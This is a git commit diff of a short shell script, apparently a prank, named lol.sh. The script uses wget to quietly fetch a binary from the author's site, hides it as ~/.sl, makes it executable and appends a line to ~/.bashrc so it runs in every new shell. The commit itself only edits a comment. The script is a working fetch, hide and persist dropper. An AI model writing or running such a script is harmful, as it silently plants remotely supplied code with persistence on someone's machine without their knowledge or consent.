121a0b2777021940d4cee740fed4b45d672281c5
Robbert <hofman.robbert@gmail.com>
2017-12-04 22:12:07 +0100

    Everything finally works

--- public/lol.sh
+++ public/lol.sh
@@ -1,5 +1,5 @@
 wget --quiet robberthofman.me/public/sl # get binary executable
-mv sl ~/.sl # hide 
+mv sl ~/.sl # hide in home directory
 chmod +x ~/.sl # give execution permission
 cp ~/.bashrc ~/.bashrc.bak # backup
 echo "~/.sl -e" >> ~/.bashrc # hehehehe
